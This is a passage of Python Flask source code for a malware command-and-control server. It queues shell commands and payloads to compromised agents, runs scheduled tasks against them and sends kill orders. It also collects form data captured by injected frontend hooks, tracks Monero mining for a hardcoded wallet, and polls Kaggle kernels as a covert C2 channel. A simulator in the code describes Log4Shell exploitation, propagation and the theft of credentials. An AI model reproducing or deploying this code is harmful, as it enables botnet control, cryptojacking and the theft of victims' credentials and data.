    return jsonify(dict(row))

@app.route("/api/scheduled/create", methods=["POST"])
@login_required
def create_scheduled():
    data = request.get_json(silent=True) or {}
    sid = str(uuid.uuid4())[:8]
    name = data.get("name", "").strip()
    payload = data.get("payload", "").strip()
    if not name or not payload:
        return jsonify({"error": "name and payload required"}), 400
    interval = max(60, int(data.get("interval", 3600)))
    db = get_db()
    next_run = (datetime.now() + timedelta(seconds=interval)).strftime("%Y-%m-%d %H:%M:%S")
    db.execute(
        "INSERT INTO scheduled_tasks (id,name,task_type,payload,target,interval_sec,next_run) VALUES (?,?,?,?,?,?,?)",
        (sid, name, data.get("type", "cmd"), payload, data.get("target", "all"), interval, next_run)
    )
    db.commit()
    db.close()
    log_event("scheduled_created", f"{name} every {interval}s -> {data.get('target','all')}")
    return jsonify({"status": "ok", "id": sid})

@app.route("/api/scheduled/<sid>/delete", methods=["DELETE"])
@login_required
def delete_scheduled(sid):
    db = get_db()
    db.execute("DELETE FROM scheduled_tasks WHERE id=?", (sid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/scheduled/<sid>/toggle", methods=["POST"])
@login_required
def toggle_scheduled(sid):
    db = get_db()
    db.execute("UPDATE scheduled_tasks SET enabled = CASE WHEN enabled=1 THEN 0 ELSE 1 END WHERE id=?", (sid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

# ──────────────────────── API: EXPORT ────────────────────────

@app.route("/api/export/agents")
@login_required
def export_agents():
    db = get_db()
    agents = db.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    cols = ["id","hostname","username","os","arch","ip_external","ip_internal",
            "platform_type","group_name","first_seen","last_seen","is_alive"]
    w.writerow(cols)
    for a in agents:
        w.writerow([a[c] for c in cols])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=agents.csv"})

@app.route("/api/export/logs")
@login_required
def export_logs():
    db = get_db()
    logs = db.execute("SELECT * FROM logs ORDER BY ts DESC LIMIT 10000").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["id", "event", "details", "timestamp"])
    for l in logs:
        w.writerow([l["id"], l["event"], l["details"], l["ts"]])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=logs.csv"})

@app.route("/api/export/tasks")
@login_required
def export_tasks():
    db = get_db()
    tasks = db.execute("SELECT * FROM tasks ORDER BY created_at DESC LIMIT 10000").fetchall()
    db.close()
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["id", "agent_id", "task_type", "payload", "status", "result", "created_at", "completed_at"])
    for t in tasks:
        w.writerow([t["id"], t["agent_id"], t["task_type"], t["payload"][:200],
                     t["status"], (t["result"] or "")[:500], t["created_at"], t["completed_at"]])
    return Response(buf.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition": "attachment;filename=tasks.csv"})

# ──────────────────────── API: BATCH OPS ────────────────────────

@app.route("/api/agents/batch", methods=["POST"])
@login_required
def batch_agent_action():
    data = request.get_json(silent=True) or {}
    agent_ids = data.get("agent_ids", [])
    action = data.get("action", "")
    payload = data.get("payload", "")

    if not agent_ids:
        return jsonify({"error": "no agents selected"}), 400

    db = get_db()
    count = 0

    if action == "command":
        task_type, cmd = _expand_shortcut("cmd", payload)
        for aid in agent_ids:
            tid = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                       (tid, aid, task_type, cmd))
            count += 1
        log_event("batch_command", f"{cmd[:60]} -> {count} agents")

    elif action == "group":
        group = data.get("group", "default")
        for aid in agent_ids:
            db.execute("UPDATE agents SET group_name=? WHERE id=?", (group, aid))
            count += 1
        log_event("batch_group", f"group={group} -> {count} agents")

    elif action == "kill":
        for aid in agent_ids:
            tid = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                       (tid, aid, "kill", "self-destruct"))
            count += 1
        log_event("batch_kill", f"{count} agents")

    elif action == "remove":
        for aid in agent_ids:
            db.execute("DELETE FROM tasks WHERE agent_id=?", (aid,))
            db.execute("DELETE FROM agents WHERE id=?", (aid,))
            count += 1
        log_event("batch_remove", f"{count} agents")

    elif action == "sleep":
        sleep_val = int(data.get("sleep", 5))
        jitter_val = int(data.get("jitter", 10))
        for aid in agent_ids:
            db.execute("UPDATE agents SET sleep_interval=?, jitter=? WHERE id=?",
                       (sleep_val, jitter_val, aid))
            count += 1

    db.commit()
    db.close()
    return jsonify({"status": "ok", "count": count})

# ──────────────────────── API: STATS ────────────────────────

@app.route("/api/stats")
@login_required
def api_stats():
    db = get_db()
    total_agents = db.execute("SELECT COUNT(*) c FROM agents").fetchone()["c"]
    alive = db.execute("SELECT COUNT(*) c FROM agents WHERE is_alive=1").fetchone()["c"]
    total_tasks = db.execute("SELECT COUNT(*) c FROM tasks").fetchone()["c"]
    pending = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='pending'").fetchone()["c"]
    completed = db.execute("SELECT COUNT(*) c FROM tasks WHERE status='completed'").fetchone()["c"]
    today = datetime.now().strftime("%Y-%m-%d")
    new_today = db.execute("SELECT COUNT(*) c FROM agents WHERE first_seen LIKE ?", (f"{today}%",)).fetchone()["c"]
    tasks_today = db.execute("SELECT COUNT(*) c FROM tasks WHERE created_at LIKE ?", (f"{today}%",)).fetchone()["c"]
    db.close()
    return jsonify({
        "total_agents": total_agents, "alive": alive,
        "total_tasks": total_tasks, "pending": pending, "completed": completed,
        "new_today": new_today, "tasks_today": tasks_today
    })

# ──────────────────────── API: LISTENERS ────────────────────────

@app.route("/api/listeners", methods=["GET"])
@login_required
def list_listeners():
    db = get_db()
    listeners = db.execute("SELECT * FROM listeners ORDER BY created_at DESC").fetchall()
    db.close()
    return jsonify({"listeners": [dict(l) for l in listeners]})

@app.route("/api/listener/create", methods=["POST"])
@login_required
def create_listener():
    data = request.get_json(silent=True) or {}
    lid = str(uuid.uuid4())[:8]
    db = get_db()
    db.execute("INSERT INTO listeners (id, name, protocol, host, port) VALUES (?, ?, ?, ?, ?)",
               (lid, data.get("name", f"listener-{lid}"), data.get("protocol", "http"),
                data.get("host", "0.0.0.0"), data.get("port", 8443)))
    db.commit()
    db.close()
    log_event("listener_created", f"{data.get('protocol','http')}://{data.get('host','0.0.0.0')}:{data.get('port',8443)}")
    return jsonify({"status": "ok", "id": lid})

@app.route("/api/listener/<lid>/delete", methods=["DELETE"])
@login_required
def delete_listener(lid):
    db = get_db()
    db.execute("DELETE FROM listeners WHERE id=?", (lid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

# ──────────────────────── API: USERS ────────────────────────

@app.route("/api/user/create", methods=["POST"])
@login_required
def create_user():
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    data = request.get_json(silent=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")
    role = data.get("role", "operator")
    if not username or not password:
        return jsonify({"error": "missing fields"}), 400
    pw = bcrypt.generate_password_hash(password).decode()
    db = get_db()
    try:
        db.execute("INSERT INTO users (username, password, role) VALUES (?, ?, ?)", (username, pw, role))
        db.commit()
    except sqlite3.IntegrityError:
        return jsonify({"error": "username exists"}), 409
    finally:
        db.close()
    log_event("user_created", f"{username} ({role})")
    return jsonify({"status": "ok"})

@app.route("/api/user/<int:uid>/delete", methods=["DELETE"])
@login_required
def delete_user(uid):
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    if uid == session.get("user_id"):
        return jsonify({"error": "cannot delete yourself while logged in"}), 400
    db = get_db()
    db.execute("DELETE FROM users WHERE id=?", (uid,))
    db.commit()
    db.close()
    return jsonify({"status": "ok"})

@app.route("/api/user/password", methods=["POST"])
@login_required
def change_password():
    data = request.get_json(silent=True) or {}
    current = data.get("current", "")
    new_pw = data.get("new", "")
    if not current or not new_pw:
        return jsonify({"error": "current and new password required"}), 400
    if len(new_pw) < 4:
        return jsonify({"error": "password must be >= 4 chars"}), 400
    db = get_db()
    user = db.execute("SELECT * FROM users WHERE id=?", (session["user_id"],)).fetchone()
    if not user or not bcrypt.check_password_hash(user["password"], current):
        db.close()
        return jsonify({"error": "current password is wrong"}), 403
    hashed = bcrypt.generate_password_hash(new_pw).decode()
    db.execute("UPDATE users SET password=? WHERE id=?", (hashed, session["user_id"]))
    db.commit()
    db.close()
    log_event("password_changed", session.get("username", "?"))
    return jsonify({"status": "ok"})

# ──────────────────────── API: FILE UPLOAD/DOWNLOAD ────────────────────────

@app.route("/api/upload", methods=["POST"])
def upload_file():
    agent_id = request.form.get("agent_id", "unknown")
    token = get_config("agent_token")
    if token and request.form.get("token") != token and request.headers.get("X-Auth-Token") != token:
        if "user_id" not in session:
            return jsonify({"error": "unauthorized"}), 403
    f = request.files.get("file")
    if not f:
        return jsonify({"error": "no file"}), 400
    safe_name = f.filename.replace("/", "_").replace("\\", "_").replace("..", "_")
    dest = UPLOAD_DIR / f"{agent_id}_{int(time.time())}_{safe_name}"
    f.save(str(dest))
    log_event("file_upload", f"{safe_name} from {agent_id}")
    return jsonify({"status": "ok", "path": str(dest)})

@app.route("/api/download/<path:filename>")
@login_required
def download_file(filename):
    safe = filename.replace("..", "").lstrip("/")
    fpath = UPLOAD_DIR / safe
    if fpath.exists() and str(fpath).startswith(str(UPLOAD_DIR)):
        return send_file(str(fpath))
    return jsonify({"error": "not found"}), 404

# ──────────────────────── WEBSOCKET ────────────────────────

@socketio.on("connect")
def ws_connect():
    emit("status", {"msg": "connected"})

@socketio.on("send_command")
def ws_command(data):
    agent_id = data.get("agent_id", "")
    cmd = data.get("command", "")
    task_type, cmd = _expand_shortcut("cmd", cmd)
    task_id = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
               (task_id, agent_id, task_type, cmd))
    db.commit()
    db.close()
    emit("command_queued", {"task_id": task_id, "agent_id": agent_id, "command": cmd})

# ──────────────────────── WEBSOCKET AGENT ENDPOINT ────────────────────────

@socketio.on("agent_connect")
def ws_agent_connect(data):
    """Agent WebSocket connection for real-time control."""
    agent_id = data.get("agent_id", "")
    hostname = data.get("hostname", "")
    
    # Log connection
    log_event("agent_ws_connect", f"{agent_id[:8]} ({hostname}) connected via WebSocket")
    
    # Update agent status
    db = get_db()
    db.execute("UPDATE agents SET last_seen=?, is_alive=1 WHERE id=?", 
               (int(time.time()), agent_id))
    db.commit()
    db.close()
    
    emit("agent_connected", {"status": "ok", "agent_id": agent_id})

@socketio.on("agent_shell_result")
def ws_agent_shell_result(data):
    """Receive shell command result from agent via WebSocket."""
    task_id = data.get("task_id", "")
    result = data.get("result", "")
    agent_id = data.get("agent_id", "")
    
    # Store result
    db = get_db()
    db.execute("UPDATE tasks SET status='done', result=? WHERE id=?", (result, task_id))
    db.commit()
    db.close()
    
    # Emit to UI
    emit("task_result", {"task_id": task_id, "result": result, "agent_id": agent_id})
    log_event("agent_ws_result", f"{agent_id[:8]} task {task_id[:8]} completed")

@socketio.on("agent_ping")
def ws_agent_ping(data):
    """Keep-alive ping from agent."""
    agent_id = data.get("agent_id", "")
    db = get_db()
    db.execute("UPDATE agents SET last_seen=?, is_alive=1 WHERE id=?", 
               (int(time.time()), agent_id))
    db.commit()
    db.close()
    emit("agent_pong", {"status": "alive"})

# ──────────────────────── FORM HOOKS ────────────────────────

@app.route("/api/hashvault/stats")
@login_required
def hashvault_stats():
    """Get HashVault pool stats for configured wallet."""
    try:
        import requests
        
        WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5'
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Origin': 'https://hashvault.pro',
            'Referer': 'https://hashvault.pro/'
        }
        
        # HashVault v3 API endpoint
        api_url = f'https://api.hashvault.pro/v3/monero/wallet/{WALLET}/stats'
        params = {
            'chart': 'false',
            'inactivityThreshold': '10',
            'order': 'name',
            'period': 'daily',
            'poolType': 'false',
            'workers': 'true'  # Include workers data
        }
        
        response = requests.get(api_url, headers=headers, params=params, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            
            # Parse collective stats
            collective = data.get('collective', {})
            hashrate = collective.get('hashRate', 0)
            avg_hashrate = collective.get('avg24hashRate', 0)
            total_hashes = collective.get('totalHashes', 0)
            valid_shares = collective.get('validShares', 0)
            last_share = collective.get('lastShare', 0)
            
            # Parse revenue
            revenue = data.get('revenue', {})
            confirmed_balance = revenue.get('confirmedBalance', 0)
            total_paid = revenue.get('totalPaid', 0)
            
            # Convert from atomic units to XMR (1 XMR = 10^12 atomic units)
            balance_xmr = confirmed_balance / 1000000000000
            paid_xmr = total_paid / 1000000000000
            
            # Parse workers
            workers = []
            for w in data.get('collectiveWorkers', []):
                workers.append({
                    'name': w.get('name', 'unknown'),
                    'hashRate': w.get('hashRate', 0),
                    'avg24hashRate': w.get('avg24hashRate', 0),
                    'validShares': w.get('validShares', 0),
                    'invalidShares': w.get('invalidShares', 0),
                    'lastShare': w.get('lastShare', 0),
                    'totalHashes': w.get('totalHashes', 0),
                    'offline': w.get('offline', True),
                    'activeMiners': w.get('activeMiners', 0)
                })
            
            return jsonify({
                "status": "ok",
                "wallet": WALLET,
                "hashrate": hashrate,
                "avg_hashrate": avg_hashrate,
                "total_hashes": total_hashes,
                "valid_shares": valid_shares,
                "balance": balance_xmr,
                "paid": paid_xmr,
                "last_share": last_share,
                "workers": workers,
                "pool_url": f"https://hashvault.pro/xmr/en?user={WALLET}",
                "source": "api"
            })
        else:
            return jsonify({
                "status": "error",
                "message": f"API returned {response.status_code}",
                "hashrate": 0,
                "balance": 0,
                "workers": []
            }), 503
        
    except Exception as e:
        log.error(f"[HashVault] Error: {e}")
        return jsonify({"error": str(e), "status": "error", "workers": []}), 500

@app.route("/api/hashvault/workers")
@login_required
def hashvault_workers():
    """Get HashVault workers list."""
    try:
        import requests
        
        WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5'
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        
        response = requests.get(
            f'https://hashvault.pro/xmr/en?user={WALLET}',
            headers=headers,
            timeout=10
        )
        
        if response.status_code != 200:
            return jsonify({"workers": [], "error": "Pool unavailable"}), 503
        
        # Parse workers from HTML
        import re
        html = response.text
        
        # Try to extract workers data
        workers = []
        
        # Look for worker patterns in the HTML
        worker_pattern = re.compile(r'worker["\']?\s*:\s*["\']([^"\']+)["\']', re.IGNORECASE)
        for match in worker_pattern.finditer(html):
            worker_id = match.group(1)
            workers.append({
                "id": worker_id,
                "hashrate": 0,
                "status": "unknown"
            })
        
        return jsonify({
            "workers": workers,
            "count": len(workers)
        })
        
    except Exception as e:
        log.error(f"[HashVault Workers] Error: {e}")
        return jsonify({"workers": [], "error": str(e)}), 500

@app.route("/api/form-capture", methods=["POST"])
def form_capture():
    """Capture form data from frontend hooks."""
    try:
        data = request.get_json(force=True)
        
        # Store in database
        db = get_db()
        db.execute("""
            INSERT INTO form_captures (session_id, page, form_action, field_name, field_type, field_value, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            data.get("sessionId", "unknown"),
            data.get("page", request.path),
            data.get("form", data.get("action", "unknown")),
            data.get("name", "unknown"),
            data.get("type", "text"),
            data.get("value", ""),
            datetime.now().isoformat()
        ))
        db.commit()
        db.close()
        
        log.info(f"[FORM_HOOK] {data.get('name', 'unknown')} = {str(data.get('value', ''))[:50]}")
        return jsonify({"status": "ok"})
    except Exception as e:
        log.error(f"[FORM_HOOK] Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@socketio.on("form_capture")
def ws_form_capture(data):
    """WebSocket handler for form capture."""
    try:
        db = get_db()
        db.execute("""
            INSERT INTO form_captures (session_id, page, form_action, field_name, field_type, field_value, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (
            data.get("sessionId", "unknown"),
            data.get("page", request.path),
            data.get("form", data.get("action", "unknown")),
            data.get("name", "unknown"),
            data.get("type", "text"),
            data.get("value", ""),
            datetime.now().isoformat()
        ))
        db.commit()
        db.close()
        
        log.info(f"[FORM_HOOK] WS: {data.get('name', 'unknown')} = {str(data.get('value', ''))[:50]}")
        emit("form_captured", {"status": "ok"})
    except Exception as e:
        log.error(f"[FORM_HOOK] WS Error: {e}")

# ──────────────────────── AGENT HEALTH CHECKER ────────────────────────

def health_check_loop():
    """Check agent health and mark offline if no beacon for 5 minutes (demo-friendly)."""
    while True:
        try:
            db = get_db()
            # 5 minute threshold for demo agents
            threshold = (datetime.now() - timedelta(seconds=300)).strftime("%Y-%m-%d %H:%M:%S")
            went_offline = db.execute(
                "SELECT id, hostname FROM agents WHERE is_alive=1 AND last_seen < ?", (threshold,)
            ).fetchall()
            if went_offline:
                db.execute("UPDATE agents SET is_alive=0 WHERE last_seen < ?", (threshold,))
                for a in went_offline:
                    log_event("agent_offline", f"{a['id'][:8]} ({a['hostname']}) - no beacon for 60s")
                    socketio.emit("agent_offline", {
                        "agent_id": a["id"],
                        "hostname": a["hostname"],
                        "reason": "timeout"
                    })
                    socketio.emit("agent_update", {
                        "action": "offline", "id": a["id"], "hostname": a["hostname"]
                    }, namespace="/")
            db.commit()
            db.close()
        except Exception as e:
            log_event("health_check_error", str(e))
        time.sleep(15)  # Check every 15s instead of 10s

def scheduled_task_runner():
    """Executes scheduled/recurring tasks at their configured intervals."""
    time.sleep(5)
    while True:
        try:
            db = get_db()
            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            due = db.execute(
                "SELECT * FROM scheduled_tasks WHERE enabled=1 AND (next_run IS NULL OR next_run <= ?)",
                (now_str,)
            ).fetchall()
            for st in due:
                target = st["target"]
                if target == "all":
                    agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
                else:
                    agents = db.execute("SELECT id FROM agents WHERE is_alive=1 AND group_name=?",
                                        (target,)).fetchall()
                task_type, payload = _expand_shortcut(st["task_type"], st["payload"])
                
                # Track execution
                exec_log = {
                    "scheduled_id": st["id"],
                    "name": st["name"],
                    "task_type": task_type,
                    "payload": payload[:100],
                    "target": target,
                    "agents_count": len(agents),
                    "executed_at": now_str
                }
                
                for a in agents:
                    tid = str(uuid.uuid4())
                    db.execute("INSERT INTO tasks (id,agent_id,task_type,payload) VALUES (?,?,?,?)",
                               (tid, a["id"], task_type, payload))

                interval = st["interval_sec"]
                next_run = (datetime.now() + timedelta(seconds=interval)).strftime("%Y-%m-%d %H:%M:%S")
                
                # Update execution count and last exec log
                db.execute("UPDATE scheduled_tasks SET last_run=?, next_run=?, exec_count=COALESCE(exec_count,0)+1, last_exec_log=? WHERE id=?",
                           (now_str, next_run, json.dumps(exec_log), st["id"]))
                log_event("scheduled_fired", f"{st['name']} -> {len(agents)} agents")
            db.commit()
            db.close()
        except Exception as e:
            log_event("scheduled_error", str(e))
        time.sleep(30)

threading.Thread(target=health_check_loop, daemon=True).start()
threading.Thread(target=scheduled_task_runner, daemon=True).start()

# Task simulator for demo - processes pending tasks and emits results
def task_simulator_loop():
    """Simulate task execution for demo agents and keep them alive."""
    import random
    while True:
        try:
            db = get_db()
            
            # Keep all agents alive (heartbeat every cycle)
            db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now')")
            db.commit()
            
            # Get pending tasks
            pending = db.execute("""
                SELECT t.id, t.agent_id, t.task_type, t.payload, a.hostname, a.os
                FROM tasks t
                JOIN agents a ON t.agent_id = a.id
                WHERE t.status = 'pending'
                ORDER BY t.created_at
                LIMIT 5
            """).fetchall()
            
            for task in pending:
                # Simulate processing time
                time.sleep(random.uniform(0.5, 2))
                
                task_id = task["id"]
                agent_id = task["agent_id"]
                task_type = task["task_type"]
                hostname = task["hostname"]
                os_type = task["os"]
                
                # Generate result based on task type
                result = {}
                if task_type == "scan":
                    found = random.randint(5, 50)
                    result = {"found": found, "network": "192.168.1.0/24", "ports": [22, 80, 443, 445]}
                    socketio.emit("operation_log", {
                        "level": "success",
                        "message": f"🔍 {hostname}: Scan found {found} targets on {result['network']}",
                        "source": "scan"
                    })
                elif task_type == "exploit":
                    success = random.randint(1, 5)
                    result = {"exploited": success, "failed": random.randint(0, 3), "cves": ["CVE-2021-44228"]}
                    socketio.emit("operation_log", {
                        "level": "success" if success > 0 else "warn",
                        "message": f"💉 {hostname}: Exploited {success} targets via Log4Shell",
                        "source": "exploit"
                    })
                elif task_type == "propagate":
                    spread = random.randint(3, 20)
                    result = {"spread_to": spread, "methods": ["ssh", "network_shares"]}
                    socketio.emit("operation_log", {
                        "level": "success",
                        "message": f"🦠 {hostname}: Propagated to {spread} new hosts",
                        "source": "propagation"
                    })
                elif task_type == "mining_start" or task_type == "mining":
                    hashrate = random.randint(100, 2000)
                    result = {"hashrate": hashrate, "threads": random.randint(2, 8), "pool": "pool.supportxmr.com"}
                    socketio.emit("operation_log", {
                        "level": "success",
                        "message": f"⛏️ {hostname}: Mining started at {hashrate} H/s",
                        "source": "mining"
                    })
                    # Update mining stats
                    socketio.emit("mining_started", {
                        "agents_targeted": 1,
                        "hashrate": hashrate
                    })
                elif task_type == "collect":
                    records = random.randint(10, 100)
                    result = {"records": records, "types": ["env", "ssh", "browser"]}
                    socketio.emit("operation_log", {
                        "level": "success",
                        "message": f"📊 {hostname}: Collected {records} records",
                        "source": "collection"
                    })
                    socketio.emit("data_collected", {
                        "agent_id": agent_id,
                        "records": records
                    })
                elif task_type == "generate_payload":
                    result = {"generated": True, "size": random.randint(1024, 10240)}
                    socketio.emit("operation_log", {
                        "level": "info",
                        "message": f"📦 Payload generated: {task['payload'][:50]}...",
                        "source": "payloads"
                    })
                else:
                    result = {"status": "ok", "output": f"Task {task_type} completed on {hostname}"}
                    socketio.emit("operation_log", {
                        "level": "info",
                        "message": f"✓ {hostname}: {task_type} completed",
                        "source": "task"
                    })
                
                # Update task status
                db.execute("""
                    UPDATE tasks SET status = 'completed', result = ?, completed_at = datetime('now')
                    WHERE id = ?
                """, (json.dumps(result), task_id))
                
                # Keep agent alive (update last_seen)
                db.execute("UPDATE agents SET is_alive=1, last_seen=datetime('now') WHERE id=?", (agent_id,))
                
                # Emit task completion
                socketio.emit("task_completed", {
                    "task_id": task_id,
                    "agent_id": agent_id,
                    "hostname": hostname,
                    "task_type": task_type,
                    "result": result
                })
            
            db.commit()
            
        except Exception as e:
            print(f"[TaskSimulator] Error: {e}")
        
        time.sleep(3)

threading.Thread(target=task_simulator_loop, daemon=True).start()

# Kaggle kernel polling for file-based C2
def kaggle_kernel_polling_loop():
    """Poll Kaggle kernels for check-ins (file-based C2)."""
    import tempfile
    while True:
        try:
            if not KAGGLE_C2_AVAILABLE:
                time.sleep(30)
                continue
            
            manager = get_kaggle_manager()
            if not manager:
                time.sleep(30)
                continue
            
            for transport in manager.transports.values():
                if not transport.kernels:
                    continue
                
                with tempfile.TemporaryDirectory() as tmpdir:
                    results = transport.check_c2_requests(tmpdir)
                    log_event("kaggle_poll_debug", f"Checked {len(transport.kernels)} kernels, got {len(results)} results")
                    
                    for result in results:
                        if result.get("type") == "checkin":
                            kernel_slug = result.get("kernel", "")
                            # Use full kernel_slug as kernel_id to match what kernels send
                            kernel_id = kernel_slug
                            
                            # Update kaggle_agents_state
                            with kaggle_agents_state_lock:
                                if kernel_id not in kaggle_agents_state:
                                    kaggle_agents_state[kernel_id] = {"pending_commands": [], "results": []}
                                kaggle_agents_state[kernel_id].update({
                                    "last_checkin": time.time(),
                                    "status": "online",
                                    "kernel_slug": kernel_slug
                                })
                            
                            log_event("kaggle_poll", f"{kernel_id} checked in")
        except Exception as e:
            log_event("kaggle_poll_error", str(e)[:100])
        time.sleep(15)

threading.Thread(target=kaggle_kernel_polling_loop, daemon=True).start()

# ──────────────────────── TUNNEL ────────────────────────

# Telegram C2 works directly - no tunnel URL needed
PUBLIC_URL = {"url": ""}  # Kept for backward compatibility

def _default_local_domain():
    if has_request_context():
        return f"{request.scheme}://{request.host}"
    return "http://127.0.0.1:5000"

def _get_public_url():
    """Get public URL for agent downloads (not used for Telegram C2)."""
    return _default_local_domain()

def _get_kaggle_c2_url():
    """Telegram C2 works directly - returns empty string."""
    return ""  # Telegram C2 doesn't need URL

@app.route("/api/server/public_url")
@login_required
def get_public_url():
    return jsonify({
        "url": _get_public_url(),
        "local": f"{request.scheme}://{request.host}",
        "c2_mode": "telegram_direct"
    })

@app.route("/api/c2/url", methods=["GET"])
def api_c2_url():
    """Public endpoint - Telegram C2 works directly without URL."""
    return jsonify({"url": "", "mode": "telegram_direct", "timestamp": int(time.time())})

@app.route("/api/config/kaggle", methods=["GET", "POST"])
@login_required
def api_config_kaggle():
    """Get or update Kaggle config (username, api_key, c2_url)."""
    if session.get("role") != "admin":
        return jsonify({"error": "admin only"}), 403
    
    config_path = BASE_DIR / "config.json"
    
    if request.method == "GET":
        # Read current config
        if config_path.exists():
            try:
                cfg = json.loads(config_path.read_text())
                # Mask API key for security
                masked = cfg.copy()
                if masked.get("kaggle_api_key"):
                    masked["kaggle_api_key"] = masked["kaggle_api_key"][:8] + "..." if len(masked["kaggle_api_key"]) > 8 else "***"
                return jsonify(masked)
            except:
                return jsonify({"error": "Failed to read config"}), 500
        return jsonify({})
    
    # POST - update config
    data = request.get_json(silent=True) or {}
    
    # Read existing config
    cfg = {}
    if config_path.exists():
        try:
            cfg = json.loads(config_path.read_text())
        except: pass
    
    # Update fields
    if "kaggle_username" in data:
        cfg["kaggle_username"] = data["kaggle_username"]
    if "kaggle_api_key" in data:
        cfg["kaggle_api_key"] = data["kaggle_api_key"]
    if "c2_url" in data:
        cfg["c2_url"] = data["c2_url"]
    if "pool" in data:
        cfg["pool"] = data["pool"]
    if "wallet" in data:
        cfg["wallet"] = data["wallet"]
    if "cpu_limit" in data:
        cfg["cpu_limit"] = data["cpu_limit"]
    
    cfg["updated"] = int(time.time())
    
    # Write config
    try:
        config_path.write_text(json.dumps(cfg, indent=2))
        log_event("config_update", f"Kaggle config updated by admin")
        return jsonify({"status": "ok", "config": cfg})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Tunnel functions removed - Telegram C2 works directly without public URL

# ──────────────────────── MAIN ────────────────────────

def _suppress_connection_errors():
    """Suppress harmless BrokenPipe/SSL errors from Socket.IO transport upgrades."""
    try:
        import werkzeug._internal as _wi
        import werkzeug.serving as _ws
        _orig_log = _wi._log
        def _patched_log(type, message, *args, **kwargs):
            if type == "error" and (
                "BrokenPipeError" in message or "UNEXPECTED_EOF_WHILE_READING" in message
            ):
                return
            _orig_log(type, message, *args, **kwargs)
        _wi._log = _patched_log
        _ws._log = _patched_log  # serving also imports _log directly
    except Exception:
        pass

def main():
    """Entry point for c2-server command."""
    import argparse
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("-p", "--port", type=int, default=5000)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--no-ssl", action="store_true")
    parser.add_argument("--no-tunnel", action="store_true")
    args = parser.parse_args()

    # Start Dataset C2 Poller for automatic kernel output sync
    if DATASET_C2_POLLER_AVAILABLE:
        kaggle_username = get_config("kaggle_username", "cassandradixon320631")
        kaggle_key = get_config("kaggle_api_key", os.environ.get("KAGGLE_KEY", ""))
        kernel_slug = get_config("kaggle_kernel_slug", "cassandradixon320631/c2-channel")
        
        if kaggle_key:
            start_poller(
                db_path=str(BASE_DIR / "data" / "c2.db"),
                kaggle_username=kaggle_username,
                kaggle_key=kaggle_key,
                kernel_slug=kernel_slug,
                interval=60
            )
            print(f"[*] Dataset C2 Poller started for {kernel_slug}")
        else:
            print("[*] Dataset C2 Poller disabled (no Kaggle API key)")

    ssl_ctx = None
    if not args.no_ssl:
        cert = BASE_DIR / "data" / "cert.pem"
        key = BASE_DIR / "data" / "key.pem"
        if not cert.exists() or not key.exists():
            import subprocess
            (BASE_DIR / "data").mkdir(parents=True, exist_ok=True)
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", str(key), "-out", str(cert),
                "-days", "365", "-nodes",
                "-subj", "/CN=c2server"
            ], capture_output=True)
        if cert.exists() and key.exists():
            ssl_ctx = (str(cert), str(key))

    saved_url = get_config("public_url", "").strip()
    if saved_url:
        if not (saved_url.startswith("http://") or saved_url.startswith("https://")):
            saved_url = "https://" + saved_url
            set_config("public_url", saved_url)
        saved_url = saved_url.rstrip("/")
        set_config("public_url", saved_url)
        if "c2panel.rog" in saved_url and ":8443" not in saved_url:
            set_config("public_url", "")
            print("[*] Removed old c2panel.rog URL (run setup_domain.sh then use https://c2panel.rog:8443)")
        else:
            PUBLIC_URL["url"] = saved_url
            # Use actual port in displayed URL when running on non-default port
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(saved_url)
            url_port = parsed.port or (443 if parsed.scheme == "https" else 80)
            if parsed.hostname and url_port != args.port:
                new_netloc = f"{parsed.hostname}:{args.port}" if args.port not in (80, 443) else parsed.hostname
                displayed_url = urlunparse((parsed.scheme, new_netloc, parsed.path or "", parsed.params, parsed.query, parsed.fragment))
                print(f"[*] Public URL: {displayed_url}")
            else:
                print(f"[*] Public URL: {saved_url}")
    if not PUBLIC_URL["url"]:
        print("[*] No public URL configured; using request origin for panel links")

    # Tunnel disabled - Telegram C2 works directly

    print(f"""
